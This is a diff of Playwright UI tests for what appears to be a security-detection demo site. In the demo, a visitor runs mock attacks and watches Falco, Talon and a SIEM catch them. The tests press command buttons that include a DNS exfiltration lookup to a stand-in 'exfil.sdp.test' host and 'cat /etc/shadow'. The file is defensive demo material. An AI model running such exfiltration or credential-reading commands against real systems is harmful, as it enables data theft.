@@ -260,13 +260,19 @@ test.describe("layout (ADR 0035, amended 2026-10-05; ?mock=1)", () => {
     expect(problems).toEqual([]);
   });
 
-  test("the tour advances through its steps from what the visitor really did (mock)", async ({ page }) => {
+  test("the tour advances through its steps from what the visitor really did (mock)", async ({ page, isMobile }) => {
     const problems = guardConsole(page);
     await page.goto("/?mock=1&mock-speed=0.3");
     const tour = page.locator("#tour .tour");
     await expect(tour.locator(".tour__step")).toHaveCount(6);
     await expect(tour.locator(".tour__count")).toContainText("Step 1 of 6");
     await expect(tour.locator(".tour__count")).toContainText("uses two of your runs");
+    // On a phone the tour is a folded bar above the terminal: the steps open on its toggle.
+    if (isMobile) {
+      await expect(tour).toHaveAttribute("data-layout", "bar");
+      await expect(tour.locator(".tour__barstep .tour__bartitle")).toHaveText("Look around");
+      await tour.getByRole("button", { name: "Show the steps" }).click();
+    } else await expect(tour).toHaveAttribute("data-layout", "side");
     await expect(tour.locator('.tour__step[data-current="true"] .tour__title')).toHaveText("Look around");
     // Step 1's button opens the terminal with `id` picked; Enter runs it and the step ticks.
     await tour.locator('.tour__step[data-current="true"] .tour__btn').click();
@@ -290,17 +296,135 @@ test.describe("layout (ADR 0035, amended 2026-10-05; ?mock=1)", () => {
     await expect(tour.locator('.tour__step[data-id="caught"]')).toHaveAttribute("data-done", "true");
     await expect(tour.locator('.tour__step[data-done="true"]')).toHaveCount(3);
     await expect(tour.locator('.tour__step[data-current="true"] .tour__title')).toHaveText("Hide it in DNS");
+    await expect(tour.locator(".tour__count")).toContainText("Step 3 of 6");
+    // The done step offers its way to the kill timeline; the notices name the detection and the answer.
+    await expect(tour.locator('.tour__step[data-id="caught"]').getByRole("button", { name: "Watch the kill timeline" })).toBeVisible();
+    await expect(tour.locator(".tour__notice--falco")).toContainText(/^Falco detected: .+ at \d\d:\d\d:\d\d CES?T\.$/);
+    await expect(tour.locator(".tour__notice--talon")).toContainText(/^Talon deleted the pod at \d\d:\d\d:\d\d CES?T\.$/);
     // The diagram lit the answer and says so in words.
     await expect(page.locator("#diagram-status")).toContainText(/answered/);
     await expect(page.locator("#diagram-status")).toContainText("detected: Falco");
     // Skipping hides the tour and is remembered; showing it brings the progress back (derived, not stored).
-    await tour.locator(".tour__head .tour__btn").click();
+    await tour.getByRole("button", { name: "Skip the tour" }).click();
     await expect(page.locator("#tour .tour--skipped")).toBeVisible();
     await page.reload();
     await expect(page.locator("#tour .tour--skipped")).toBeVisible();
     await page.locator("#tour .tour--skipped .tour__btn").click();
     await expect(page.locator("#tour .tour__step")).toHaveCount(6);
     expect(problems).toEqual([]);
+  });
+
+  test("nothing scrolls the page but the visitor: steps completing, the SIEM's incident, Falco's alert and Talon's answer leave scrollY alone (desktop and phone)", async ({ page, isMobile }) => {
+    test.setTimeout(60_000);
+    const problems = guardConsole(page);
+    await page.setViewportSize(isMobile ? { width: 390, height: 844 } : { width: 1440, height: 900 });
+    await page.goto("/?mock=1&mock-speed=0.3&mock-siem-delay=3000");
+    const tour = page.locator("#tour .tour");
+    const term = page.locator("#terminal");
+    // The visitor goes to the attack section themselves.
+    await page.evaluate(() => document.getElementById("attack")?.scrollIntoView({ behavior: "instant" }));
+    await page.waitForTimeout(200);
+    if (isMobile) await tour.getByRole("button", { name: "Show the steps" }).click();
+    // A click is the visitor's (Playwright scrolls a target into view to press it): scrollY is read
+    // right after each press, and must not change while the page answers.
+    const y = () => page.evaluate(() => scrollY);
+    await tour.locator('.tour__step[data-current="true"] .tour__btn').click();
+    let y0 = await y();
+    expect(y0).toBeGreaterThan(100);
+    await expect(term.locator("#term-input")).toHaveValue("id");
+    await expect(term.locator("#term-input")).toBeEnabled({ timeout: 10_000 });
+    expect(await y()).toBe(y0);
+    await term.locator("#term-input").press("Enter");
+    await expect(tour.locator('.tour__step[data-done="true"]')).toHaveCount(1);
+    await expect(term.locator("#term-input")).toBeEnabled({ timeout: 10_000 });
+    expect(await y()).toBe(y0);
+    // The DNS exfil: the step ticks, the SIEM files its incident a moment later - a notice, not a jump.
+    // On a phone the output and the "This run" rows sit above the chips, and the browser's scroll
+    // anchoring keeps the chips the visitor pressed where they are as those grow: what must hold
+    // there is that the chips do not move; on a desktop the number itself.
+    const chipTop = () => term.locator(".term__chips").evaluate((el) => Math.round(el.getBoundingClientRect().top));
+    const still = async (y: number, c: number) => {
+      if (isMobile) expect(Math.abs((await chipTop()) - c)).toBeLessThanOrEqual(2);
+      else expect(await page.evaluate(() => scrollY)).toBe(y);
+    };
+    await term.getByRole("button", { name: "nslookup sdp-<flag>.x.exfil.sdp.test." }).click();
+    y0 = await y();
+    let c0 = await chipTop();
+    await expect(tour.locator('.tour__step[data-id="hide"]')).toHaveAttribute("data-done", "true");
+    const siem = tour.locator(".tour__notice--siem");
+    await expect(siem).toHaveCount(1, { timeout: 20_000 });
+    await expect(siem.locator(".tour__ntext")).toHaveText(/^The SIEM caught your DNS exfiltration — incident filed at \d\d:\d\d:\d\d CES?T\.$/);
+    await expect(siem.getByRole("link", { name: "Show in SIEM" })).toHaveAttribute("href", /^#incident-[0-9a-f]{16}$/);
+    await expect(tour.locator('.tour__step[data-id="siem"]')).toHaveAttribute("data-done", "true");
+    await still(y0, c0);
+    // The notice list is polite and in the panel; nothing took the focus away from the terminal.
+    await expect(tour.locator(".tour__notices")).toHaveAttribute("aria-live", isMobile ? "off" : "polite");
+    expect(await page.evaluate(() => document.activeElement?.closest("#tour, #correlation") ?? null)).toBeNull();
+    if (isMobile) {
+      // One small toast says it on a phone, with its link, dismissable: the run's own (ui/runstatus.ts)
+      // while the strip is out of view, else the tour's (role=status); never both.
+      const toasts = page.locator(".tour-toast:not([hidden]), .run-toast:not([hidden])");
+      await expect(toasts).toHaveCount(1);
+      const toast = toasts.first();
+      await expect(toast).toContainText(/The SIEM caught your DNS exfil/);
+      await expect(toast.getByRole("link", { name: /Show in SIEM|Open it/ })).toBeVisible();
+      if ((await toast.getAttribute("class"))?.includes("tour-toast")) await expect(toast).toHaveAttribute("role", "status");
+      await toast.getByRole("button", { name: /Dismiss/ }).click();
+      await expect(toast).toBeHidden();
+    } else await expect(page.locator(".tour-toast")).toHaveCount(0);
+    // Getting caught: Falco's alert and Talon's answer are notices too, and the summary does not pull the page.
+    await term.getByRole("button", { name: "cat /etc/shadow" }).click();
+    y0 = await y();
+    c0 = await chipTop();
+    await expect(term.locator(".term__summary")).toBeVisible({ timeout: 15_000 });
+    await expect(tour.locator(".tour__notice--talon")).toHaveCount(1);
+    await expect(tour.locator(".tour__notice--falco")).toHaveCount(1);
+    await page.waitForTimeout(300);
+    await still(y0, c0);
+    // Only the visitor's own press on "Show in SIEM" goes there: the section opens and the card is in view.
+    await siem.getByRole("link", { name: "Show in SIEM" }).click();
+    await expect(page.locator("#correlation .section__toggle")).toHaveAttribute("aria-expanded", "true");
+    await expect(page.locator("#correlation .incident--own").first()).toBeInViewport();
+    expect(problems).toEqual([]);
+  });
+
+  test("at 1440x900 the tour is a panel beside the terminal that stays in view (sticky) through the attack section", async ({ page, isMobile }) => {
+    test.skip(isMobile, "the side panel is a wide-screen layout");
+    await page.setViewportSize({ width: 1440, height: 900 });
+    await page.goto("/?mock=1&mock-speed=0.3");
+    const term = page.locator("#terminal");
+    await term.getByRole("button", { name: /Open the terminal/ }).click();
+    await expect(term.locator("#term-input")).toBeEnabled({ timeout: 10_000 });
+    for (const name of ["id", "ps", "ls -la /srv/shop", "grep Cap /proc/self/status", "cat /srv/shop/.flag", "hostname"]) {
+      await term.getByRole("button", { name, exact: true }).click();
+      await expect(term.locator("#term-input")).toBeEnabled({ timeout: 10_000 });
+    }
+    const rects = () =>
+      page.evaluate(() => {
+        const r = (sel: string) => document.querySelector(sel)!.getBoundingClientRect();
+        return { tour: r("#tour .tour"), wrap: r("#tour"), term: r("#terminal"), termWrap: r(".terminal-wrap"), header: r(".site-header"), vh: innerHeight };
+      });
+    await page.evaluate(() => document.getElementById("terminal")?.scrollIntoView({ behavior: "instant" }));
+    let m = await rects();
+    // Beside: the panel's column starts where the terminal's ends, on the same row.
+    expect(m.tour.left).toBeGreaterThanOrEqual(m.term.right);
+    expect(Math.abs(m.wrap.top - m.termWrap.top)).toBeLessThan(2);
+    expect(m.term.width).toBeGreaterThan(700);
+    // Scrolled down through the session, the panel stays below the header and inside the viewport,
+    // as long as the terminal goes on below the fold.
+    let steps = 0;
+    for (;;) {
+      await page.evaluate(() => scrollBy(0, 100));
+      await page.waitForTimeout(100);
+      m = await rects();
+      if (m.term.bottom < m.vh) break;
+      steps++;
+      expect(m.tour.top).toBeGreaterThanOrEqual(m.header.bottom);
+      expect(m.tour.top).toBeLessThan(m.vh / 2);
+      expect(m.tour.bottom).toBeLessThanOrEqual(m.vh + 1);
+      await expect(page.locator("#tour .tour")).toBeInViewport();
+    }
+    expect(steps).toBeGreaterThanOrEqual(3);
   });
 
   test("on a first visit everything below the attack folds; the attack and the hero diagram stay open", async ({ page }) => {
@@ -637,12 +761,24 @@ test.describe("live run console (mock)", () => {
     await expect(page.locator("#console .console__scenario")).toHaveText("Read /etc/shadow");
   });
 
-  test("on a phone, launching takes the visitor to the live run", async ({ page, isMobile }) => {
-    test.skip(!isMobile, "the scroll matters where the console is below the fold");
+  test("launching does not move the page: the status line links to the live run, and that link takes the visitor there", async ({ page, isMobile }) => {
     await page.goto("/?mock=1");
     const button = page.locator('.scenario[data-scenario="drop-and-execute"] .btn--attack');
+    // The press is the visitor's (Playwright scrolls the button into view to press it): scrollY is
+    // read right after it, and must not change while the run starts and the console fills. On a
+    // phone the status line's three lines grow above the console, and the browser's scroll anchoring
+    // keeps the pressed button where it is: that is what must hold there.
+    const top = () => button.evaluate((el) => Math.round(el.getBoundingClientRect().top));
     await button.click();
-    await expect(page.locator("#console-title")).toBeFocused();
+    const before = await page.evaluate(() => scrollY);
+    const t0 = await top();
+    const link = page.locator("#launch-status a[href='#console']");
+    await expect(link).toHaveText("live run below ↓");
+    await expect(page.locator("#console .console__run")).toHaveCount(1);
+    await page.waitForTimeout(300);
+    if (isMobile) expect(Math.abs((await top()) - t0)).toBeLessThanOrEqual(2);
+    else expect(await page.evaluate(() => scrollY)).toBe(before);
+    await link.click();
     await expect(page.locator("#console-title")).toBeInViewport();
     await noHorizontalScroll(page);
   });
